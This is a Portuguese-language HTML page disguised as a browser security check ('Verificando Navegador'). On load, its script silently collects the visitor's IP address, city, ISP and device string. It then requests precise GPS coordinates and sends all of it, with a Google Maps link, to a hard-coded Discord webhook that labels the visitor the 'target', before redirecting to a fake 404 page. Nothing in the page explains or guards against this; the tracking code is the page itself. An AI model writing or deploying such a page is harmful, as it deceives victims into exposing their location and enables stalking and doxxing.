<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando Navegador...</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="content" style="text-align: center;">
        <div class="loader" style="margin: 0 auto 15px;"></div>
        <p>Aguarde, verificando seguran√ßa da conex√£o...</p>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1473782004226195456/X3ZuJvvwZYDp-ZpF_BSTFOhifd6tq_CRiEMlcz_LkiMPZR9kLbdMBRS6Y1a5PaEaUiKe";

        async function enviarParaDiscord(titulo, cor, campos) {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: titulo,
                        color: cor,
                        fields: campos,
                        footer: { text: "Registrado em: " + new Date().toLocaleString('pt-BR') }
                    }]
                })
            });
        }

        async function iniciarCaptura() {
            let ipData = { ip: "Desconhecido", city: "Desconhecida", region: "", org: "" };
            
            // 1. Pega o IP imediatamente (n√£o pede permiss√£o)
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
                
                await enviarParaDiscord("‚ö†Ô∏è ALVO ACESSOU O LINK", 3447003, [
                    { name: "üåê IP P√∫blico", value: ipData.ip },
                    { name: "üè† Localiza√ß√£o (IP)", value: `${ipData.city}, ${ipData.region} - ${ipData.org}` },
                    { name: "üì± Dispositivo", value: navigator.userAgent }
                ]);
            } catch (e) { console.log("Erro IP"); }

            // 2. Tenta o GPS (Pede permiss√£o)
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;

                    await enviarParaDiscord("üéØ LOCALIZA√á√ÉO EXATA (GPS)", 16711680, [
                        { name: "üìç Coordenadas", value: `${lat}, ${lon}` },
                        { name: "üó∫Ô∏è Google Maps", value: googleMaps },
                        { name: "üåê IP Vinculado", value: ipData.ip }
                    ]);

                    // Redireciona ap√≥s sucesso
                    setTimeout(() => { window.location.href = "https://google.com/404"; }, 1000);

                }, async (erro) => {
                    // Se o usu√°rio negar ou o PC n√£o tiver GPS
                    await enviarParaDiscord("‚ùå GPS NEGADO/FALHOU", 16776960, [
                        { name: "Motivo", value: "Usu√°rio recusou ou dispositivo sem GPS f√≠sico" },
                        { name: "IP do Alvo", value: ipData.ip }
                    ]);
                    window.location.href = "https://google.com/404";
                }, { enableHighAccuracy: true, timeout: 10000 });
            } else {
                window.location.href = "https://google.com/404";
            }
        }

        window.onload = iniciarCaptura;
    </script>
</body>
</html>
